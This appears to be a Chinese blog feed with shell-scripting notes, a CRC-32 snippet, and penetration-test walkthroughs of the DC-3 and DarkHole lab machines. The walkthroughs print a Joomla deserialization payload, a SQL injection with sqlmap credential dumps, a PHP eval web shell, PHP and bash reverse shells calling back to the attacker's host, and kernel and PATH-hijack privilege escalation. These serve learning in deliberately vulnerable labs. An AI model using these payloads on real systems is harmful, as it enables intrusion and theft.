&lt;/form&gt;</code></pre><p>改成html尾缀,这里的变量名一定要是PHP_SESSION_UPLOAD_PROGRESS</p><p><strong>打开html任意上传一个文件并抓包</strong></p><p>修改filename为</p><blockquote><p>|O:4:&quot;test&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;flag&quot;;}</p></blockquote><p><img src="/../image/image-20240425211118879.png" alt="image-20240425211118879"></p><p><img src="/../image/image-20240425212308789.png" alt="image-20240425212308789"></p><p>就告一段落了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell笔记</title>
      <link href="/2024/04/12/shell%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/12/shell%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章：小试牛刀"><a href="#第一章：小试牛刀" class="headerlink" title="第一章：小试牛刀"></a>第一章：小试牛刀</h1><h2 id="1-1-在终端中显示输出"><a href="#1-1-在终端中显示输出" class="headerlink" title="1.1 在终端中显示输出"></a>1.1 在终端中显示输出</h2><p>​用户是通过终端会话同she1l环境打交道的。如果你使用的是基于图形用户界面的系统，这指的就是终端窗口。如果没有图形用户界面(生产服务器或SSH会话)，那么登录后你看到的就是shell提示符。</p><p>​在终端中显示文本是大多数脚本和实用工具经常需要执行的任务。she1l可以使用多种方法和格式显示文本。</p><h3 id="1-1-1-预备知识"><a href="#1-1-1-预备知识" class="headerlink" title="1.1.1 预备知识"></a>1.1.1 预备知识</h3><p>​命令都是在终端会话中输人并执行的。打开终端时会出现一个提示符。有很多方法可以配置提示符，不过其形式通常如下:</p><pre><code>username@hostname$[youzipii@localhost ~]$</code></pre><p>或者也可以配置成root@hostname #，或者简单地显示为$或#。</p><p><strong>$表示普通用户，#表示管理员用户root。root是Linux系统中权限最高的用户。</strong></p><p><strong>注意：</strong></p><p>​因为如果shell（root）具备较高的权限，命令中出现的输入错误有可能造成更严重的破坏所以推荐使用普通用户(shel1会在提示符中以s来表明这种身份)登录系统，然后借助sudo这类工具来运行特权命令。使用sudo<command><arguments>执行命令的效果和root一样。</p><p>shell脚本通常以shebang起始:</p><pre><code class="bash">#!/bin/bahs</code></pre><p>​shebang是一个文本行,其中#!位于解释器路径之前。&#x2F;bin&#x2F;bash是Bash的解释器命令路径,bash将以#符号开头的行视为注释。脚本中只有第一行可以使用shebang来定义解释该脚本所使用的解释器。</p><p>脚本的执行方式有两种。</p><p>(1)将脚本名作为命令行参数:</p><p>​bash myScript.sh</p><p>(2)授予脚本执行权限，将其变为可执行文件:</p><p>​chmod 755 myscript.sh</p><p>​.&#x2F;myScript.sh.</p><p>​如果将脚本作为bash的命令行参数来运行，那么就用不着使用shebang了。可以利用shebang来实现脚本的独立运行。可执行脚本使用shebang之后的解释器路径来解释脚本。</p><p>​使用chmoa命令赋予脚本可执行权限:<br>​$ chmod a+x sample.sh</p><p>​该命令使得所有用户可以按照下列方式执行该脚本:</p><p>​$ &#x2F;sample.sh#.&#x2F;表示当前目录<br>或者</p><p>​$ &#x2F;home&#x2F;path&#x2F;sample.sh #使用脚本的完整路径<br>​内核会读取脚本的首行并注意到shebang为#!&#x2F;bin&#x2F;bash。它会识别出&#x2F;bin&#x2F;bash并执行该脚本:<br>​$ &#x2F;bin&#x2F;bash sample.sh<br>​当启动一个交互式she1l时，它会执行一组命令来初始化提示文本、颜色等设置。这组命令来自用户主目录中的脚本文件<del>&#x2F;.bashrc(对于登录shel则是</del>&#x2F;.bash profle)。Bash shell还维护了一个历史记录文件~&#x2F;.bash history，用于保存用户运行过的命令。</p><p>~:表示主目录，通常是&#x2F;home&#x2F;user 其中user是用户名，如果是root则为&#x2F;root</p><p>图形化环境创建的终端不会读取profile或bash_profile（绝大多数情况下），而ssh登陆远程系统时会读取profile。shell使用分号或换行符来分隔单个命令或命令序列。比如：</p><p>$cm1 ; cmd2</p><p>这等同于</p><p>$cmd1</p><p>$cmd2<br>    注释部分以#为起始，一直延续到行尾。注释行通常用于描述代码或是在调试期间禁止执行某行代码·:<br>    #sample.sh-echoes “hello world”<br>    echo “hello world”</p><h3 id="1-1-2-练习"><a href="#1-1-2-练习" class="headerlink" title="1.1.2 练习"></a>1.1.2 练习</h3><p>echo用于终端打印的最基本命令。</p><p>默认情况下，echo在每次调用后会添加一个换行符：</p><pre><code class="bash">[youzipii@localhost ~]$ echo &quot;Welcome o bash&quot;Welcome o bash</code></pre><p>​只需要将文本放人双引号中，echo命令就可以将其中的文本在终端中打印出来。类似地不使用双引号也可以得到同样的输出结果.</p><p>​需要注意的是这些方法看起来相似，但各有特定的用途及副作用。双引号允许she1l解释字符串中出现的特殊字符。单引号不会对其做任何解释。</p><p>​如果需要打印像!这样的特殊字符，那就不要将其放入双引号中，而是使用单引号，或是在特殊字符之前加上一个反斜线():但我试了下好像都可以</p><p>​另一个可用于终端打印的命令是printf。该命令使用的参数和C语言中的printf函数一样。<br>例如:</p><pre><code class="bash">#!/bin/bash#文件名： printf.shprintf &quot;%-5s %-10s %-4s\n&quot; No Name Markprintf &quot;%-5s %-10s % -4.2f\n&quot; 1 Sarath 80.3456</code></pre><p><img src="/../image/image-20240412201042680.png" alt="image-20240412201042680"></p><h3 id="1-1-3-工作原理"><a href="#1-1-3-工作原理" class="headerlink" title="1.1.3 工作原理"></a>1.1.3 工作原理</h3><p>​%s、%c、%d和%f都是格式替换符(fommat substitution character )，它们定义了该如何打印后续参数。-5s指明了一个格式为左对齐且宽度为5的字符串替换(-表示左对齐)。如果不指明-,字符串就采用右对齐形式。宽度指定了保留给某个字符串的字符数量。对Name而言，其保留宽度是10。因此，任何Name字段的内容都会被显示在10字符宽的保留区域内，如果内容不足10个字符，余下的则以空格填充。</p><p>​对于浮点数，可以使用其他参数对小数部分进行舍人(round of)。</p><p>​对于Mark字段，我们将其格式化为$-4.2f，其中.2指定保留两位小数。注意，在每行的格式字符串后都有一个换行符(\n )。</p><h3 id="1-1-4-补充内容"><a href="#1-1-4-补充内容" class="headerlink" title="1.1.4 补充内容"></a>1.1.4 补充内容</h3><p>​使用echo和printf的命令选项时，要确保选项出现在命令中的所有字符串之前，否则Bash会将其视为另外一个字符串。</p><ol><li>在echo中转义换行符</li></ol><p>​默认情况下，echo会在输出文本的尾部追加一个换行符。可以使用选项-n来禁止这种行为。echo同样接受双包含转义序列的双引号字符串作为参数。在使用转义序列时，需要使用echo -e”包含转义序列的字符串”这种形式。例如:</p><p><img src="/../image/image-20240412201415626.png" alt="image-20240412201415626"></p><ol start="2"><li>打印彩色输出</li></ol><p>​脚本可以使用转义序列在终端中生成彩色文本。</p><p>​文本颜色是由对应的色彩码来描述的。其中包括:重置&#x3D;0，黑色&#x3D;30，红色&#x3D;31，绿色&#x3D;32,黄色&#x3D;33，蓝色&#x3D;34，洋红&#x3D;35，青色&#x3D;36，白色&#x3D;37。</p><p><img src="/../image/image-20240412201531119.png" alt="image-20240412201531119"></p><p>​其中\e[1;31m是一个转义字符串，可以将颜色设为红色，\e[0m将颜色重新置回。只需要将31替换成想要的色彩码就可以了。<br>​对于彩色背景，经常使用的颜色码是:重置&#x3D;0，黑色&#x3D;40，红色&#x3D;41，绿色-42，黄色-43蓝色&#x3D;44，洋红&#x3D;45，青色&#x3D;46，白色&#x3D;47。</p><p>​要设置彩色背景的话，可输入如下命令:<br><img src="/../image/image-20240412201653480.png" alt="image-20240412201653480"></p><p>这些例子中包含了一些转义序列。可以使用man console_codes来查看相关文档。</p><h2 id="1-2-使用变量与环境变量"><a href="#1-2-使用变量与环境变量" class="headerlink" title="1.2 使用变量与环境变量"></a>1.2 使用变量与环境变量</h2><p>​所有的编程语言都利用变量来存放数据，以备随后使用或修改。和编译型语言不同，大多数脚本语言不要求在创建变量之前声明其类型。用到什么类型就是什么类型。在变量名前面加上一个美元符号就可以访问到变量的值。shell定义了一些变量，用于保存用到的配置信息，比如可用的打印机、搜索路径等。这些变量叫作<strong>环境变量</strong>。</p><h3 id="1-2-1-预备知识"><a href="#1-2-1-预备知识" class="headerlink" title="1.2.1 预备知识"></a>1.2.1 预备知识</h3><p>​变量名由一系列字母、数字和下划线组成，其中不包含空白字符。常用的惯例是在脚本中使用大写字母命名环境变量，使用驼峰命名法或小写字母命名其他变量。</p><p>​所有的应用程序和脚本都可以访问环境变量。可以使用env或printenv命令查看当前shell中所定义的全部环境变量:</p><p><img src="/../image/image-20240412201913135.png" alt="image-20240412201913135"></p><p>要查看其他进程的环境变量，可以使用如下命令:</p><pre><code class="bash">sudo cat /proc/$PID/environ</code></pre><p>其中，PID是相关进程的进程ID(PID是一个整数)。我们可以使用pgrep或ps -aux | grep 进程名令获得进程ID:</p><p><img src="/../image/image-20240412202225249.png" alt="image-20240412202225249"></p><p><img src="/../image/image-20240412202332320.png" alt="image-20240412202332320"></p><p>​特殊文件&#x2F;proc&#x2F;PID&#x2F;environ是一个包含环境变量以及对应变量值的列表。每一个变量以name&#x3D;value的形式来描述，彼此之间由null字符(\0)分隔。形式上确实不太易读。</p><p>要想生成一份易读的报表，可以将cat命令的输出通过管道传给tr，将其中的\0替换成\n:<br>    $cat &#x2F;proc&#x2F;5588&#x2F;environ | tr ‘\0’ ‘\n’</p><p><img src="/../image/image-20240412202522980.png" alt="image-20240412202522980"></p><h3 id="1-2-2-练习"><a href="#1-2-2-练习" class="headerlink" title="1.2.2 练习"></a>1.2.2 练习</h3><p>​可以使用等号操作符为变量赋值:<br>​varName&#x3D;value<br>​varName是变量名，value是赋给变量的值。如果value不包含任何空白字符(例如空格)，那么就不需要将其放入引号中，否则必须使用单引号或双引号。</p><p><strong>注意</strong>:var &#x3D;value不同于var&#x3D;value。把var&#x3D;value写成var &#x3D;value是一个常见的错误。两边没有空格的等号是赋值操作符,加上空格的等号表示的是等量关系测试。</p><p>在变量名之前加上美元符号($)就可以访问变量的内容。</p><pre><code class="bash">#!/bin/bashvar=&quot;value&quot;echo $var</code></pre><p><img src="/../image/image-20240412203000936.png" alt="image-20240412203000936"></p><p>我们可以在printf、echo或其他命令的双引号中引用变量值:</p><pre><code class="bash">#!/bin/bashfruit=applecount=5echo &quot;We have $count $&#123;fruit&#125;&#123;s&#125;&quot;</code></pre><p><img src="/../image/image-20240412210750534.png" alt="image-20240412210750534"></p><p>​因为shell使用空白字符来分隔单词，所以我们需要加上一对花括号来告诉shell这里的变量名是fruit，而不是fruit(s)。</p><p>​环境变量是从父进程中继承而来的变量。例如环境变量HTTP_PROXY，它定义了Intermet连接应该使用哪个代理服务器。</p><p>​该环境变量通常被设置成:<br>​HTTP PROXY&#x3D;192.168.1.23:3128<br>​export HTTP_PROXY</p><p>​export命令声明了将由子进程所继承的一个或多个变量。这些变量被导出后，当前shell脚本所执行的任何应用程序都会获得这个变量。she1l创建并用到了很多标准环境变量，我们也可以导出自己的环境变量。<br>​例如，PATH变量列出了一系列可供she1l搜索特定应用程序的目录。一个典型的PATH变量包含如下内容:</p><p><img src="/../image/image-20240412211049043.png" alt="image-20240412211049043"></p><p>​各目录路径之间以:分隔。$PATH通常定义在&#x2F;etc&#x2F;environment、&#x2F;etc&#x2F;profile或~&#x2F;.bashrc中。如果需要在PATH中添加一条新路径，可以使用如下命令:</p><p><img src="/../image/image-20240412211154589.png" alt="image-20240412211154589"></p><p>另外还有一些众所周知的环境变量:HOME、PWD、USER、UID、SHELL等。</p><p><img src="/../image/image-20240412211252443.png" alt="image-20240412211252443"></p><p>​使用单引号时,变量不会被扩展( expand),仍依照原样显示。这意味着s echo$var’会显示svar。<br>​但如果变量$var已经定义过，那么secho”svar”会显示出该变量的值;如果没有定义过，则什么都不显示。</p><h3 id="1-2-3-补充内容"><a href="#1-2-3-补充内容" class="headerlink" title="1.2.3 补充内容"></a>1.2.3 补充内容</h3><p>shell还有很多内建特性。下面就是其中一些。</p><ol><li>获得字符串的长度</li></ol><p>&#96;&#96;&#96;bash<br>#!&#x2F;bin&#x2F;bash<br>var&#x3D;1234567890<br>echo $</p>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2024/04/10/DC-3/"/>
      <url>/2024/04/10/DC-3/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p><strong>kali:192.168.174.137</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>nmap -sn ip&#x2F;24 发现主机</p><p><img src="/../image/image-20240410182529933.png" alt="image-20240410182529933"></p><p><strong>获得主机ip：192.168.174.150</strong></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.150</p><p>参数解释：</p><ol><li><strong>-sS</strong>: 使用 SYN 扫描</li><li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li><li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li><li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li><li><strong>-p-</strong>: 扫描所有端口。</li></ol><p><img src="/../image/image-20240410182952717.png" alt="image-20240410182952717"></p><p>可以看到开放了1个端口</p><p>80-http apache 2.4.18</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/../image/image-20240410183030982.png" alt="image-20240410183030982"></p><p>访问的同时，在后台进行目录扫描,看一下主页的信息,可以发现这次只有一个flag，且需要进入root权限获取</p><pre><code>这一次，只有一面旗帜，一个入口，没有线索。要获得该标志，显然必须获得根权限。如何成为root取决于你自己，当然也取决于系统。祝你好运——我希望你喜欢这个小挑战。：-）</code></pre><p>目录扫描到一个<a href="http://192.168.174.150/administrator/%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E4%B8%80%E6%A0%B7%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%94%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E7%AD%89%E9%87%8D%E5%AE%9A%E5%90%91%E4%B9%9F%E6%98%AF%E6%B2%A1%E5%B7%AE%E3%80%82">http://192.168.174.150/administrator/，访问后发现一样是一个登陆界面，且忘记密码等重定向也是没差。</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="/../image/image-20240410190923148.png" alt="image-20240410190923148"></p><p>但界面上的Joomla！倒是提醒我们可以去看看有没有存在的漏洞，一艘还真有<a href="https://blog.csdn.net/smli_ng/article/details/115799954">Joomla 漏洞总结</a>我们先用<a href="https://blog.csdn.net/smli_ng/article/details/115799954#t2">CVE-2015-8562 反序列化漏洞</a>试试，就按着文章里的教程实验</p><p><strong>首先我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie</strong></p><p><img src="/../image/image-20240410192928091.png" alt="image-20240410192928091"></p><p><strong>然后将User-Agent设置为以下内容，然后cookie设置为才刚目标网站返回的内容。</strong></p><pre><code>123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;</code></pre><p>这一种好像不行，不懂是不是这个版本修复了，换一种方法试试</p><h4 id="CVE-2017-8917-SQL注入漏洞"><a href="#CVE-2017-8917-SQL注入漏洞" class="headerlink" title="CVE-2017-8917 SQL注入漏洞"></a>CVE-2017-8917 SQL注入漏洞</h4><p>构造payload</p><pre><code>?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</code></pre><p>访问主页<img src="/../image/image-20240410194637343.png" alt="image-20240410194637343"></p><p>发现可以使用，上sqlmap试试</p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> –dbs</p><p>&#x2F;&#x2F;*表示注入位置<br>&#x2F;&#x2F;查询所有数据库<br><img src="/../image/image-20240410195907716.png" alt="image-20240410195907716"></p><p><img src="/../image/image-20240410195949663.png" alt="image-20240410195949663"></p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> -D “joomladb” -T “#__users” –columns<br>查询users表内的列名,选择sqlmap自带的默认的字典即可</p><p><img src="/../image/image-20240410200501591.png" alt="image-20240410200501591"></p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> -D “joomladb” -T “#__users” -C “username,password” –dump<br>&#x2F;&#x2F;读取指定字段内容</p><p><img src="/../image/image-20240410200627349.png" alt="image-20240410200627349"></p><p>密码为md5加密 可以使用kali内的john 解密</p><pre><code>touch admin.txt   #创建文件vi admin.txt      #编辑john admin.txt    #破解</code></pre><p><img src="/../image/image-20240410201249865.png" alt="image-20240410201249865"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote><p>通过对后台的各种查询，发现Extensions-&gt;Templates里面的模板可以执行PHP脚本</p><p>这个不看下攻略没用过的话还挺难找</p></blockquote><p><img src="/../image/image-20240410202148182.png" alt="image-20240410202148182"></p><p><img src="/../image/image-20240410202233083.png" alt="image-20240410202233083"></p><pre><code class="php">//当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。$sock = fsockopen(&quot;192.168.174.137&quot;, &quot;5555&quot;);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);</code></pre><p><img src="/../image/image-20240410202545098.png" alt="image-20240410202545098"></p><p>之后保存访问<a href="http://192.168.174.150/index.php%EF%BC%8Ckali%E7%94%A8nc%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%BC%B9">http://192.168.174.150/index.php，kali用nc接收反弹</a></p><p><img src="/../image/image-20240410202616938.png" alt="image-20240410202616938"></p><p>接下来就是提权了，先转化一下终端</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/../image/image-20240410202723341.png" alt="image-20240410202723341"></p><p>find &#x2F; -user root -perm 4000 -print &gt;&#x2F;dev&#x2F;null</p><p>看了下没有适合利用suid提权的命令，找了下home目录，dc3也是空的，但发现个隐藏文件.sudo_admin_successfule.不懂后面有没有用，继续跟着教程看看</p><p>另外开一个终端去漏洞库查找有没有相关漏洞</p><pre><code>cat /etc/*release#查看发行版信息</code></pre><p><img src="/../image/image-20240410210247798.png" alt="image-20240410210247798"></p><p>是ubuntu 16.04</p><pre><code>cat /proc/version  #查看内核版本的全部信息</code></pre><p><img src="/../image/image-20240410210324583.png" alt="image-20240410210324583"></p><p>内核时Linux 4.4.0，查看kali本地漏洞库里面的exp。</p><p><img src="/../image/image-20240410210703519.png" alt="image-20240410210703519"></p><p>对应得版本要都试试，我这里因为是直接看攻略所以 就直接用39772.txt</p><p>查看exp</p><pre><code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code></pre><p><img src="/../image/image-20240410210845350.png" alt="image-20240410210845350"></p><p>可以看到有下载地址，我们下载下面那个zip文件wget就行</p><p><img src="/../image/image-20240410210954802.png" alt="image-20240410210954802"></p><p>然后用python搭建一个简单服务器</p><pre><code>python -m http.server 8081</code></pre><p>回到反弹回来得shell，wget文件即可</p><pre><code>wget http://192.168.174.137:8081/39772.zip</code></pre><p><img src="/../image/image-20240410211555816.png" alt="image-20240410211555816"></p><p>解压exp</p><pre><code>unzip 39772.zip</code></pre><p><em>进入39772</em> </p><pre><code>cd 39772</code></pre><p>解压缩exploit.tar</p><pre><code>tar -xvf exploit.tar</code></pre><p><img src="/../image/image-20240410212043213.png" alt="image-20240410212043213"></p><p>进入 ebpf_mapfd_doubleput_exploit 运行exp</p><pre><code>./compile.sh./doubleput</code></pre><p><img src="/../image/image-20240410212800584.png" alt="image-20240410212800584"></p><p>过一会就会变成root用户了，还挺神奇。</p><p><img src="/../image/image-20240410212849338.png" alt="image-20240410212849338"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DarkHole</title>
      <link href="/2024/04/07/DarkHole/"/>
      <url>/2024/04/07/DarkHole/</url>
      
        <content type="html"><![CDATA[<h1 id="DockerHole"><a href="#DockerHole" class="headerlink" title="DockerHole"></a>DockerHole</h1><p><strong>kali:192.168.174.137</strong></p><p><strong>给靶机生成个物理地址00:50:56:23:4C:10</strong></p><p><img src="/../image/image-20240407163518855.png" alt="image-20240407163518855"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>arp-scan -l 发现主机</p><p><img src="/../image/image-20240407163800693.png" alt="image-20240407163800693"></p><p><strong>获得主机ip：192.168.174.149</strong></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.149</p><p>参数解释：</p><ol><li><strong>-sS</strong>: 使用 SYN 扫描</li><li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li><li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li><li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li><li><strong>-p-</strong>: 扫描所有端口。</li></ol><p><img src="/../image/image-20240407164135872.png" alt="image-20240407164135872"></p><p>可以看到开放了两个端口</p><p>22-ssh Openssh</p><p>80-http apache 2.4.41</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/../image/image-20240407164518989.png" alt="image-20240407164518989"></p><p>访问的同时，在后台进行目录扫描</p><p>可以获得<a href="http://192.168.174.149/upload/%E6%8E%A8%E6%B5%8B%E5%8F%AF%E8%83%BD%E6%9C%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%87%83%E7%81%AB%E5%8F%B3%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%AD%89%E3%80%82">http://192.168.174.149/upload/推测可能有文件上传漏洞，燃火右上角有一个登陆界面，可能存在弱口令，sql注入等。</a></p><h3 id="登陆界面"><a href="#登陆界面" class="headerlink" title="登陆界面"></a>登陆界面</h3><p><img src="/../image/image-20240407172106009.png" alt="image-20240407172106009"></p><p>简单尝试admin:admind登陆看下返回信息有没有提示，发现没有，去注册一个试试</p><p><img src="/../image/image-20240407172304098.png" alt="image-20240407172304098"></p><p>发现admin用户已经被注册了，后台开一个bp先爆破着，自己注册一个账号登陆上去看看有什么信息</p><p><img src="/../image/image-20240407173200797.png" alt="image-20240407173200797"></p><p><img src="/../image/image-20240407173225389.png" alt="image-20240407173225389"></p><p>可以看到，注册完有自己的信息和修改密码的功能且网址中还有个id&#x3D;2，推测id&#x3D;1为admin用户的界面，修改试下能不能访问</p><p><img src="/../image/image-20240407173325093.png" alt="image-20240407173325093"></p><p>试试抓包能不能直接修改admin的密码</p><p><img src="/../image/image-20240407173402240.png" alt="image-20240407173402240"></p><p>改成1后试试用admin登陆，可以看到登陆成功</p><p><img src="/../image/image-20240407173449466.png" alt="image-20240407173449466"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>登陆上管理员界面后发现多了个文件上传的地方，结合前面的目录，可能 存在文件上传漏洞，先试试上传自己写的一句话木马</p><pre><code class="php">&lt;?php @eval($_POST[&#39;CMD&#39;]); ?&gt;</code></pre><p><img src="/../image/image-20240407184027696.png" alt="image-20240407184027696"></p><p>可以发现只允许上传jpg,png,gif这样的图片，试试绕过方法</p><p><img src="/../image/image-20240407184400185.png" alt="image-20240407184400185"></p><p>先试试修改类型</p><p><img src="/../image/image-20240407184513629.png" alt="image-20240407184513629"></p><p>上传一张正常的图片试试</p><p><img src="/../image/image-20240407185347279.png" alt="image-20240407185347279"></p><p>发现文件路径，访问一下也确实能出现图片</p><p><img src="/../image/image-20240407185413474.png" alt="image-20240407185413474"></p><p>修改下后缀试试，pphphp绕过了</p><p><img src="/../image/image-20240407190606652.png" alt="image-20240407190606652"></p><p>但文件并没有以php的形式保留下来，作了个图片马，也不行，试试别的方法，phtml和pchar可以</p><p><img src="/../image/image-20240407191935091.png" alt="image-20240407191935091"></p><p><img src="/../image/image-20240407191959674.png" alt="image-20240407191959674"></p><p>下面就是寻找flag的提取过程了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在获取到shell的基础上，我么需要反弹shell</p><p>kali：nv -lvvp6666</p><p>shell: bash -c ‘bash -i  &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.174.137&#x2F;6666  0&gt;&amp;1’</p><p><img src="/../image/image-20240407194457299.png" alt="image-20240407194457299"></p><h3 id="sudo-root提权"><a href="#sudo-root提权" class="headerlink" title="sudo root提权"></a>sudo root提权</h3><p>cat &#x2F;etc&#x2F;passwd 发现了john用户 在家目录下面发现了一个toto文件执行发现和id一样的功能</p><p><img src="/../image/image-20240407200300090.png" alt="image-20240407200300090"></p><p><img src="/../image/image-20240407200340646.png" alt="image-20240407200340646"></p><pre><code class="bash">cd tmptouch idecho &quot;/bin/bash&quot; &gt; idchmod 777 idexport PATH=/tmp;$PATHcd /home/john./totocat user.txt</code></pre><p><img src="/../image/image-20240407201525851.png" alt="image-20240407201525851"></p><p>然后现在我们再次执行就可以查看账号和密码文件了 直接使用<code>SSH</code>进行连接：<code>john/root123</code></p><p><img src="/../image/image-20240407201629653.png" alt="image-20240407201629653"></p><p><strong>ssh <a href="mailto:&#106;&#x6f;&#104;&#110;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#49;&#55;&#52;&#46;&#x31;&#x34;&#57;">&#106;&#x6f;&#104;&#110;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#49;&#55;&#52;&#46;&#x31;&#x34;&#57;</a></strong></p><p><img src="/../image/image-20240407201814765.png" alt="image-20240407201814765"></p><pre><code>echo &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; &gt; file.pycat file.pysudo python3 /home/john/file.py输入密码root123</code></pre><p><img src="/../image/image-20240407202419380.png" alt="image-20240407202419380"></p><p>直接执行好像是不能提权的</p><p><img src="/../image/image-20240407203015057.png" alt="image-20240407203015057"></p><p>但他对file.py这个文件是有执行权限的，所以从这一点出发，所以才要把语句写到文件里。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC-32</title>
      <link href="/2024/03/23/CRC-32/"/>
      <url>/2024/03/23/CRC-32/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;string.h&gt;#include&lt;time.h&gt; static uint32_t poly = 0x04C11DB7; //多项式函数//用无符号整型unsigned int 模拟32位寄存器 uint32_t crc32(char * str, int len)&#123;    uint32_t poly = 0x04C11DB7;  //多项式函数     uint32_t data = 0xffffffff; //初始化寄存器     int i = 0;    for (i = 0; i &lt; len; i++)    &#123;        data ^= str[i]&lt;&lt;24; //由高字节向低字节循环处理         int j = 0;a        for (j = 0; j &lt; 8; j++)        &#123;            if (data &amp; 0x80000000) //最高位为1，就与多项式进行异或                data = (data &lt;&lt; 1) ^ poly;            else                data &lt;&lt;= 1;               &#125;    &#125;    return data ^ 0xffffffff; //反转运算 &#125; //int main() &#123;////生成CRC32表 ////generate_crc32_table();//uint32_t crc32_table_res = 0;//char** str = 